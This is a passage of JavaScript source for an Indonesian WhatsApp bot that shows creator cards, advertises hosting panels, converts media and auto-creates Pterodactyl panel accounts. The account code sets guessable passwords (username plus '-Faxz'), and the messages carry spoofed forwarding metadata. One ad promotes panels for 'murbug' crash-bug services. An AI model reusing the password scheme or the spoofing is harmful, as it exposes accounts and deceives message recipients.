                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, {})
  
await AlwaysFaxzMd.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
break
                break
case 'owner': {
let name = m.pushName || AlwaysFaxzMd.getName(m.sender);
await AlwaysFaxzMd.sendMessage(m.chat, { react: { text: '😎', key: m.key }})
let pan = `
> *\`[ # ]\`* *Halo Kak Ini Owner & Creator Ku Yg Ganteng*
`;
const url = fs.readFileSync("./lib/system/thumb.jpg")
async function image(url) {
  const { imageMessage } = await generateWAMessageContent({
    image: {
      url
    }
  }, {
    upload: AlwaysFaxzMd.waUploadToServer
  });
  return imageMessage;
}
let msg = generateWAMessageFromContent(
  m.chat,
  {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          body: {
            text: pan
          },
          carouselMessage: {
            cards: [
              {
                header: proto.Message.InteractiveMessage.Header.create({
          ...(await prepareWAMessageMedia({ image: { url: './lib/system/owner.jpg' } }, { upload: AlwaysFaxzMd.waUploadToServer })),
          title: ``,
          gifPlayback: true,
          subtitle: ownername,
          hasMediaAttachment: false
        }),
                body: {
                  text: `
           「 ★ *\`[OWNER BOT]\`* ★ 」`
                },
                nativeFlowMessage: {
                  buttons: [
                    {
                      name: "cta_url",
                      buttonParamsJson: `{"display_text":"👤 Chat Owner ( ${global.ownername} )","url":"https://wa.me/${global.ownernumber}","merchant_url":"https://wa.me/${global.ownernumber}"}`
                    },
                  ],
                },
              },
              {
                header: proto.Message.InteractiveMessage.Header.create({
          ...(await prepareWAMessageMedia({ image: { url: './lib/system/creator.jpg' } }, { upload: AlwaysFaxzMd.waUploadToServer })),
          title: ``,
          gifPlayback: true,
          subtitle: ownername,
          hasMediaAttachment: false
        }),
                body: {
                  text: `
     「 ★ *\`[Creator Script]\`* ★ 」`
                },
                nativeFlowMessage: {
                  buttons: [
                    {
                      name: "cta_url",
                      buttonParamsJson: `{"display_text":"  💬  Chat Creator ( Always Faxz )","url":"https://wa.me/6283116555026?text=*々+𝐴𝑙𝑤𝑎𝑦𝑠+𝐹𝑎𝑥𝑧+々*","merchant_url":"https://wa.me/6283116555026?text=*Always+Faxz*"}`
                    },
                  ],
                },
              },
            ],
            messageVersion: 1,
          },
        },
      },
    },
  },
  {}
);

await AlwaysFaxzMd.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id,
});

}
break
case 'p': {
replyalwaysfaxz(`*[#]* _PELANGGARAN_\n\n*_Gapunya Agama Kah Kak? Minimal Salam_*\n\n*Dalam Islam Saja Di Ajarkan Mengucap Salam*\n> \`\`\`Asallamualaikum\`\`\`  *Mudah & Singkat Namun Di Abaikan Oleh Para Orang Muslim Juga*\nKenapa Harus *( P )* Dapat Uang Kah? Engga Kan? Bukan Uang Yang Kau Dapat Tetapi Kegilaan.`)
}
break
case 'asalamualaikum': case 'assalamualaikum': {
replyalwaysfaxz(`*Masyaallah Masih Ada Orang Yg Mengingat Salam Rupaya*\n\n\`Tunggu Ya Kak Mungkin Owner Saya Sedang Offline Jika Sudah Online Akan Di Respons Secepat Mungkin Kok :)\``)
}
break
case 'trx-on2': {
const webstore = `
*\`All Trx On By ${global.namastore}\`*
*_kunjungi untuk untuk melihat produk_*

_©AlwaysFaxz_`
let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: webstore
          }),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
										"name": "cta_url",
										"buttonParamsJson": `{\"display_text\":\"KUNJUNGI\",\"url\":\"https://alwaysfaxz.github.io/ShopWebsiteFaxz/\",\"merchant_url\":\"https://alwaysfaxz.github.io/ShopWebsiteFaxz/\"}`
									},
            {
										"name": "cta_url",
										"buttonParamsJson": `{\"display_text\":\"BUY SCRIPT\",\"url\":\"https://wa.me/6283116555026?text=*AlwaysFaxz*+Saya+Mau+Buy+Sc+DigitalBotz\",\"merchant_url\":\"https://wa.me/6283116555026?text=*AlwaysFaxz*+Saya+Mau+Buy+Sc+DigitalBotz\"}`
									},
            {
										"name": "quick_reply",
										"buttonParamsJson": `{\"display_text\":\"KEMBALI\",\"id\":\".menu\"}`
									},],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363294318768415@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, {})
  
await AlwaysFaxzMd.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
break
case 'trx-on': case 'myproduct': case 'all-on': {
let name = m.pushName || AlwaysFaxzMd.getName(m.sender);
await AlwaysFaxzMd.sendMessage(m.chat, { react: { text: '⚖', key: m.key }})
let pan = `
> \`\`\`All Trx On By ${global.namastore}\`\`\` 💸
`;
const url = fs.readFileSync("./lib/system/thumb.jpg")
async function image(url) {
  const { imageMessage } = await generateWAMessageContent({
    image: {
      url
    }
  }, {
    upload: AlwaysFaxzMd.waUploadToServer
  });
  return imageMessage;
}
let msg = generateWAMessageFromContent(
  m.chat,
  {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          body: {
            text: pan
          },
          carouselMessage: {
            cards: [
              {
                header: proto.Message.InteractiveMessage.Header.create({
          ...(await prepareWAMessageMedia({ image: { url: './lib/system/produk1.jpg' } }, { upload: AlwaysFaxzMd.waUploadToServer })),
          title: ``,
          gifPlayback: true,
          subtitle: ownername,
          hasMediaAttachment: false
        }),
                body: {
                  text: `
┏───────────────┈ 
┆ 「 *\`[ PRODUK SATU ]\`* 」
┣───────────────┈ 
> //========================//
> *RESELLER PANEL = Rp 10k*
> *ADMIN PANEL = Rp 15k*
> *PT PANEL = Rp 20k*
> *OWN PANEL = Rp 25k*
- *KEUNTUNGAN RESSELER PANEL*
> ★ BISA JUALAN PANEL
> ★ BISA OPEN SEWA BOT,DLL
- *KEUNTUNGAN ADMIN PANEL*
> ★ BISA OPEN RESELLER PANEL
> ★ BISA OPEN SEWA BOT
> ★ BISA JUALAN PANEL,DLL TANYA PM AJA
- *KEUNTUNGAN PT PANEL*
> ★ JUALAN PANEL
> ★ BISA OPEN RESELLER
> ★ BISA OPEN ADMIN PANEL,DLL TANYA PM AJA
- *KEUNTUNGAN OWN PANEL*
> ★ BISA JUALAN PANEL
> ★ BISA OPEN RESELLER PANEL
> ★ BISA OPEN ADMIN PANEL
> ★ BISA OPEN PT PANEL,DLL TANYA KE PM AJA
> //========================//
> _© ${global.namastore}_
└────────────┈ ⳹`
                },
                nativeFlowMessage: {
                  buttons: [
                    {
                      name: "cta_url",
                      buttonParamsJson: `{"display_text":"💲BELI PRODUCT 1💲","url":"https://wa.me/${global.jualan}","merchant_url":"https://wa.me/${global.jualan}"}`
                    },
                  ],
                },
              },
              {
                header: proto.Message.InteractiveMessage.Header.create({
          ...(await prepareWAMessageMedia({ image: { url: './lib/system/produk2.jpg' } }, { upload: AlwaysFaxzMd.waUploadToServer })),
          title: ``,
          gifPlayback: true,
          subtitle: ownername,
          hasMediaAttachment: false
        }),
                body: {
                  text: `
┏───────────────┈ 
┆ 「 *\`[ PRODUK DUA ]\`* 」
┣───────────────┈ 
> //========================//
> *LIST PANEL PTERODACTYL*
> =========================//
> *•> RAM 1GB = 1K*
> *•> RAM 2GB = 2K*
> *•> RAM 3GB = 3K*
> *•> RAM 4GB = 4K*
> *•> RAM 5GB = 5K*
> *•> RAM UNLI = 8K*
> =========================//
> *FUNGSI*
- BUAT RUN BOT
> *SAVETY*
- GARANSI 10 HARI
> *KEUNTUNGAN*
- BISA OPEN MURBUG
- BISA BUAT PUSH KONTAK
- BISA BUAT TES SC
- BISA BUAT NYOBA NYOBA SC BARU,DLL
> *OPEN JUGA*
- RESELLER PANEL
- ADMIN PANEL
- PT PANEL
- OWNER PANEL
- SC LANGKA/VIP
> //========================//
> _© ${global.namastore}_
└────────────┈ ⳹`
                },
                nativeFlowMessage: {
                  buttons: [
                    {
                      name: "cta_url",
                      buttonParamsJson: `{"display_text":"💲BELI PRODUCT 2💲","url":"https://wa.me/${global.jualan}","merchant_url":"https://wa.me/${global.jualan}"}`
                    },
                  ],
                },
              },
            ],
            messageVersion: 1,
          },
        },
      },
    },
  },
  {}
);

await AlwaysFaxzMd.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id,
});

}
break
            case 'sticker':
            case 'stiker':
            case 's': {
                if (!quoted) return replyalwaysfaxz(`Reply to Video/Image With Caption ${prefix + command}`)
                if (/image/.test(mime)) {
                    let media = await quoted.download()
                    let encmedia = await AlwaysFaxzMd.sendImageAsSticker(m.chat, media, m, {
                        packname: packname,
                        author: author
                    })
                    await fs.unlinkSync(encmedia)
                } else if (isVideo || /video/.test(mime)) {
                    if ((quoted.msg || quoted).seconds > 11) return replyalwaysfaxz('Maximum 10 seconds!')
                    let media = await quoted.download()
                    let encmedia = await AlwaysFaxzMd.sendVideoAsSticker(m.chat, media, m, {
                        packname: packname,
                        author: author
                    })
                    await fs.unlinkSync(encmedia)
                } else {
                    return replyalwaysfaxz(`Send Images/Videos With Captions ${prefix + command}\nVideo Duration 1-9 Seconds`)
                }
            }
            break
            case 'smeme': {
                let respond = `Send/Reply image/sticker with caption ${prefix + command} text1|text2`
                if (!/image/.test(mime)) return replyalwaysfaxz(respond)
                if (!text) return replyalwaysfaxz(respond)
                replyalwaysfaxz(mess.wait)
                atas = text.split('|')[0] ? text.split('|')[0] : '-'
                bawah = text.split('|')[1] ? text.split('|')[1] : '-'
                let dwnld = await AlwaysFaxzMd.downloadAndSaveMediaMessage(qmsg)
                let fatGans = await TelegraPh(dwnld)
                let smeme = `https://api.memegen.link/images/custom/${encodeURIComponent(bawah)}/${encodeURIComponent(atas)}.png?background=${fatGans}`
                let pop = await AlwaysFaxzMd.sendImageAsSticker(m.chat, smeme, m, {
                    packname: packname,
                    author: author
                })
                fs.unlinkSync(pop)
            }
            break
            case 'toimage':
            case 'toimg': {
                if (!/webp/.test(mime)) return replyalwaysfaxz(`Reply sticker with caption *${prefix + command}*`)
                replyalwaysfaxz(mess.wait)
                let media = await AlwaysFaxzMd.downloadAndSaveMediaMessage(qmsg)
                let ran = await getRandom('.png')
                exec(`ffmpeg -i ${media} ${ran}`, (err) => {
                    fs.unlinkSync(media)
                    if (err) return err
                    let buffer = fs.readFileSync(ran)
                    AlwaysFaxzMd.sendMessage(m.chat, {
                        image: buffer
                    }, {
                        quoted: m
                    })
                    fs.unlinkSync(ran)
                })

            }
            break
            case 'tomp4':
            case 'tovideo': {
                if (!/webp/.test(mime)) return replyalwaysfaxz(`Reply sticker with caption *${prefix + command}*`)
                replyalwaysfaxz(mess.wait)
                let media = await AlwaysFaxzMd.downloadAndSaveMediaMessage(qmsg)
                let webpToMp4 = await webp2mp4File(media)
                await AlwaysFaxzMd.sendMessage(m.chat, {
                    video: {
                        url: webpToMp4.result,
                        caption: 'Convert Webp To Video'
                    }
                }, {
                    quoted: m
                })
                await fs.unlinkSync(media)

            }
            break
            case 'pin':
              case 'pinterest': {
    let input = "> _contoh: pin Marsha lenathea_";
    if (!text) return replyalwaysfaxz(input);
     replyalwaysfaxz('*Loading....*');
    const createImage = async (url) => {
        const { imageMessage } = await generateWAMessageContent({
            image: {
                url
            }
        }, {
            upload: AlwaysFaxzMd.waUploadToServer
        });
        return imageMessage;
    };
    async function pinterest(query) {
        let res = await fetch(`https://www.pinterest.com/resource/BaseSearchResource/get/?source_url=%2Fsearch%2Fpins%2F%3Fq%3D${query}&data=%7B%22options%22%3A%7B%22isPrefetch%22%3Afalse%2C%22query%22%3A%22${query}%22%2C%22scope%22%3A%22pins%22%2C%22no_fetch_context_on_resource%22%3Afalse%7D%2C%22context%22%3A%7B%7D%7D&_=1619980301559`);
        let json = await res.json();
        let data = json.resource_response.data.results;
        if (!data.length) replyalwaysfaxz(`Query "${query}" not found :/`);
        return data[~~(Math.random() * data.length)].images.orig.url;
    }
    const imageUrls = [];
    for (let i = 0; i < 10; i++) {
        const imageUrl = await pinterest(text);
        imageUrls.push(imageUrl);
    }
    const cards = await Promise.all(imageUrls.map(async (url, index) => ({
        header: proto.Message.InteractiveMessage.Header.fromObject({
            title: `Image ${index + 1}`,
            hasMediaAttachment: true,
            imageMessage: await createImage(url)
        }),
        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
            buttons: [] // Hapus semua tombol
        })
    })));
    const msg = generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
            message: {
                messageContextInfo: {
                    deviceListMetadata: {},
                    deviceListMetadataVersion: 2
                },
                interactiveMessage: proto.Message.InteractiveMessage.fromObject({
                    body: proto.Message.InteractiveMessage.Body.fromObject({
                        text: `${text}\n> Batas 10 photo`
                    }),
                    carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
                        cards
                    })
                })
            }
        }
    }, {});

    await AlwaysFaxzMd.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
    });
};
break
            case 'toaud':
            case 'toaudio': {
                if (!/video/.test(mime) && !/audio/.test(mime)) return replyalwaysfaxz(`Send/Reply Video/Audio that you want to make into audio with caption ${prefix + command}`)
                replyalwaysfaxz(mess.wait)
                let media = await AlwaysFaxzMd.downloadMediaMessage(qmsg)
                let audio = await toAudio(media, 'mp4')
                AlwaysFaxzMd.sendMessage(m.chat, {
                    audio: audio,
                    mimetype: 'audio/mpeg'
                }, {
                    quoted: m
                })

            }
            break
            case 'tomp3': {
                if (!/video/.test(mime) && !/audio/.test(mime)) return replyalwaysfaxz(`Send/Reply Video/Audio that you want to make into MP3 with caption ${prefix + command}`)
                replyalwaysfaxz(mess.wait)
                let media = await AlwaysFaxzMd.downloadMediaMessage(qmsg)
                let audio = await toAudio(media, 'mp4')
                AlwaysFaxzMd.sendMessage(m.chat, {
                    document: audio,
                    mimetype: 'audio/mp3',
                    fileName: `faxz.mp3`
                }, {
                    quoted: m
                })

            }
            break
            case 'tovn':
            case 'toptt': {
                if (!/video/.test(mime) && !/audio/.test(mime)) return replyalwaysfaxz(`Reply Video/Audio that you want to make into a VN with caption ${prefix + command}`)
                replyalwaysfaxz(mess.wait)
                let media = await AlwaysFaxzMd.downloadMediaMessage(qmsg)
                let {
                    toPTT
                } = require('./lib/converter')
                let audio = await toPTT(media, 'mp4')
                AlwaysFaxzMd.sendMessage(m.chat, {
                    audio: audio,
                    mimetype: 'audio/mpeg',
                    ptt: true
                }, {
                    quoted: m
                })

            }
            break
            case 'spek': {
            await loading()
const faxzzz = `
\`\`\`Hello i'am AlwaysFaxz\`\`\`
\`\`\`The Creator Script Md\`\`\`
\`\`\`[ DigitalBotz ] I'am Sell\`\`\`
\`\`\`The Script This 10.000\`\`\`
\`\`\`Buy The Script? Chat Me\`\`\`\n\n*\`Spek Sc\`*
> *_Ready 60 Subdomain_*
> *_Menu Ai On_*
> *_Menu Downloader on_*
> *_Menu Ytmp3 & Play on_*
> *_Hdr on_*
> *_Telestick not eror_*
> *_Fiture Store on_*
> *_Create Panel_*

_©AlwaysFaxz_`
let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: faxzzz
          }),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
										"name": "cta_url",
										"buttonParamsJson": `{\"display_text\":\"BUY SCRIPT\",\"url\":\"https://wa.me/6283116555026?text=*AlwaysFaxz*+Saya+Mau+Buy+Sc+DigitalBotz\",\"merchant_url\":\"https://wa.me/6283116555026?text=*AlwaysFaxz*+Saya+Mau+Buy+Sc+DigitalBotz\"}`
									},
            {
										"name": "quick_reply",
										"buttonParamsJson": `{\"display_text\":\"KEMBALI\",\"id\":\".menu\"}`
									},],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363294318768415@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, {})
  
await AlwaysFaxzMd.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
break
case 'creator': {
await loading()
const faxzxz = `\`\`\`Hello i'am AlwaysFaxz\`\`\`
 \`\`\`The Creator Script Md\`\`\`
 \`\`\`AlwaysFaxz-DigitalBotz\`\`\``
let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: faxzxz
          }),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
										"name": "cta_url",
										"buttonParamsJson": `{\"display_text\":\"Chat Creator\",\"url\":\"https://wa.me/6283116555026\",\"merchant_url\":\"https://wa.me/6283116555026\"}`
									},
            {
										"name": "quick_reply",
										"buttonParamsJson": `{\"display_text\":\"KEMBALI\",\"id\":\".menu\"}`
									},],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363294318768415@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, {})
  
await AlwaysFaxzMd.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
break
            case 'togif': {
                if (!/webp/.test(mime)) return replyalwaysfaxz(`Reply sticker with caption *${prefix + command}*`)
                replyalwaysfaxz(mess.wait)
                let media = await AlwaysFaxzMd.downloadAndSaveMediaMessage(qmsg)
                let webpToMp4 = await webp2mp4File(media)
                await AlwaysFaxzMd.sendMessage(m.chat, {
                    video: {
                        url: webpToMp4.result,
                        caption: 'Convert Webp To Video'
                    },
                    gifPlayback: true
                }, {
                    quoted: m
                })
                await fs.unlinkSync(media)

            }
            break
            case "1gb": {
if (!isPremium) return replyalwaysfaxz(`*\`[ # ]\`* _Fitur Ini Khusus Premium_\n*Jika Belum Premium Silahkan Ketik => .buypremium*`)
let t = text.split(',');
if (t.length < 2) return replyalwaysfaxz(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = global.eggsnya
let loc = global.location3
let memo = "1050"
let cpu = "30"
let disk = "1050"
let email = username + "Faxz@ganteng.com"

if (!u) return
let d = (await AlwaysFaxzMd.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "-Faxz"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return replyalwaysfaxz(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})

const ctf = `📦 \`Kring Kring Pakett\` 📦 ͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏

  *BERIKUT DATA AKUN PANEL DARI BG FAXZ YG GANTENG BANGET🗿🤙*

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain}

NOTE:
OWNER HANYA MENGIRIM 1X DATA 
AKUN ANDA MOHON DI SIMPAN BAIK BAIK
KALAU DATA AKUN ANDA HILANG OWNER
TIDAK DAPAT MENGIRIM AKUN ANDA LAGI
<========{[ \`PERBATASAN\` ]}=======>

\`WAJIB SAVE NO ATMIN UTAMA :\` 6283116555026
\`JOIN SALURAN NGAP :\` https://whatsapp.com/channel/0029VadfaUY2v1IsC78Cqa2z

*_YANG GA SAVE MANDUL MINIMAL KALO MAU SV CHAT DULU BIAR KE SAVE BACK_*

*UDAH GITU AJA*
=====================================
© Always Faxz`
AlwaysFaxzMd.sendMessage(u, { caption: ctf, image: fs.readFileSync("./lib/system/pterodactyl.jpg") });
let data2 = await f2.json();


let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": "</> 々Always Faxz 々 </>\nWA : 6283116555026",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": "if [[ -d .git ]] && [[ \${AUTO_UPDATE} == \"1\" ]]; then git pull; fi; if [[ ! -z \${NODE_PACKAGES} ]]; then /usr/local/bin/npm install \${NODE_PACKAGES}; fi; if [[ ! -z \${UNNODE_PACKAGES} ]]; then /usr/local/bin/npm uninstall \${UNNODE_PACKAGES}; fi; if [ -f /home/container/package.json ]; then /usr/local/bin/npm install; fi; /usr/local/bin/\${CMD_RUN}",
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return replyalwaysfaxz(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await replyalwaysfaxz(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}

break
case "2gb": {
if (!isPremium) return replyalwaysfaxz(`*\`[ # ]\`* _Fitur Ini Khusus Premium_\n*Jika Belum Premium Silahkan Ketik => .buypremium*`)
let t = text.split(',');
if (t.length < 2) return replyalwaysfaxz(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = global.eggsnya
let loc = global.location3
let memo = "2070"
let cpu = "60"
let disk = "2070"
let email = username + "Faxz@ganteng.com"

if (!u) return
let d = (await AlwaysFaxzMd.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "-Faxz"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return replyalwaysfaxz(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})

